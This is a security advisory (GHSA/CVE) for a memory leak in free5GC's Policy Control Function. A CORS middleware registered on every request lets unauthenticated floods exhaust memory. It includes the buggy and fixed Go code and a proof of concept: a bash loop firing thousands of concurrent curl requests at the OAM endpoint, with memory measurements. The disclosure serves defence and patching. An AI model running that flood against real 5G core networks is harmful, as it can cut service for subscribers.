# [H] free5GC PCF: Memory Leak via CORS Middleware Registration in HTTP Handler Leads to Denial of Service

## Summary
Severity: High
Advisory: GHSA-98cp-84m9-q3qp
CVE: CVE-2026-41135
CWE: CWE-400
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-04-22
Source: https://github.com/advisories/GHSA-98cp-84m9-q3qp
Type: github-advisory

## Affected
- Go: `github.com/free5gc/pcf` — affected >=0 <1.4.3

## Details
## Summary

A memory leak vulnerability in the free5GC PCF (Policy Control Function) allows any unauthenticated attacker with network access to the PCF SBI interface to cause uncontrolled memory growth by sending repeated HTTP requests to the OAM endpoint. The root cause is a `router.Use()` call inside an HTTP handler that registers a new CORS middleware on every incoming request, permanently growing the Gin router's handler chain. This leads to progressive memory exhaustion and eventual Denial of Service of the PCF, preventing all UEs from obtaining AM and SM policies and blocking 5G session establishment.

## Details

**File:** `free5gc/pcf/internal/sbi/api_oam.go`  
**Function:** `setCorsHeader()`, called by `HTTPOAMGetAmPolicy()`

The function `setCorsHeader()` invokes `s.router.Use()` on every incoming HTTP request:

```go
func (s *Server) setCorsHeader(c *gin.Context) {
    // BUG: router.Use() inside a handler — executes on every request
    s.router.Use(cors.New(cors.Config{
        AllowMethods:     []string{"GET", "POST", "OPTIONS", "PUT", "PATCH", "DELETE"},
        AllowAllOrigins:  true,
        AllowCredentials: true,
        MaxAge:           CorsConfigMaxAge,
    }))
    // Redundant manual header setting
    c.Writer.Header().Set("Access-Control-Allow-Origin", "*")
    c.Writer.Header().Set("Access-Control-Allow-Credentials", "true")
    // ...
}

func (s *Server) HTTPOAMGetAmPolicy(c *gin.Context) {
    s.setCorsHeader(c) // ← called on every GET /npcf-oam/v1/am-policy/:supi
    // ...
}
```
In the Gin framework, `router.Use()` appends a new `HandlerFunc` to the router's internal middleware slice. This operation is **not idempotent** — it does not replace existing middleware but appends a new instance on every call. After N requests, Gin executes N CORS middleware instances before reaching the actual handler:

Request N → [cors_mw_1 → cors_mw_2 → ... → cors_mw_N → actual_handler]

Since `s.router` holds a permanent reference to the accumulated middleware slice, the Go garbage collector cannot free this memory. The additional issue of `AllowAllOrigins: true` combined with `AllowCredentials: true` also constitutes a CORS misconfiguration (forbidden by the CORS specification), though this is secondary to the memory leak.

**Fix:** Move `router.Use(cors.New(...))` to the server initialization function (called once at startup), and remove `setCorsHeader()` from all handlers entirely:

```go
// ✅ server.go — called once at startup
func (s *Server) initRouter() {
    s.router.Use(cors.New(cors.Config{
        AllowMethods:     []string{"GET", "POST", "OPTIONS", "PUT", "PATCH", "DELETE"},
        AllowOrigins:     []string{"https://trusted-origin.example.com"},
        AllowCredentials: false,
        MaxAge:           CorsConfigMaxAge,
    }))
}
```
## PoC

**Environment:**
- free5GC v4.2.1 (commit `df535f55`, build `2026-03-04`)
- PCF container IP: `10.22.22.6`, port `80`
- Attacker: any container on the same Docker network (tested from UDM container)
- No authentication required (OAuth2 disabled)

**Step 1** — Record memory baseline:
```bash
docker stats --no-stream | grep pcf
# Output: 24.86 MiB
```

**Step 2** — Launch flood from attacker container:
```bash
for i in $(seq 1 5000); do
    curl -s http://10.22.22.6/npcf-oam/v1/am-policy/imsi-222771234567890 > /dev/null &
    [ $((i % 100)) -eq 0 ] && wait && echo "[*] $i req sent"
done
wait
```

**Step 3** — Monitor memory growth:
```bash
watch -n 2 "docker stats --no-stream | grep pcf"
```

**Results:**

| Requests sent | PCF Memory | Delta      |
|---------------|------------|------------|
| 0 (baseline)  | 24.86 MiB  | —          |
| ~5,000        | 46.48 MiB  | +21.62 MiB |
| ~10,000       | 58.59 MiB  | +12.11 MiB |
| ~15,000       | 70.30 MiB  | +11.71 MiB |
| ~100,000 (projected) | ~170+ MiB | OOM kill |

Memory never returns to baseline between request batches, confirming permanent retention by the router's middleware chain.

## Impact

**Vulnerability type:** Uncontrolled Resource Consumption (Memory Exhaustion) leading to Denial of Service.

**Who is impacted:** Any deployment of free5GC where the PCF OAM interface is reachable from the internal 5G core network. Since all 5G core NFs share the same Docker network by default, any compromised or attacker-controlled NF container can trigger this vulnerability without credentials.

**5G service impact:** The PCF is responsible for providing AM (Access and Mobility) policies to the AMF and SM (Session Management) policies to the SMF. A DoS of the PCF prevents:
- New UE registrations (AM policy creation fails)
- New PDU session establishment (SM policy creation fails)
- Policy updates for existing sessions

In a production deployment this would result in complete loss of 5G service for all subscribers served by the affected PCF instance.

## References
- https://github.com/free5gc/free5gc/security/advisories/GHSA-98cp-84m9-q3qp
- https://nvd.nist.gov/vuln/detail/CVE-2026-41135
- https://github.com/free5gc/free5gc
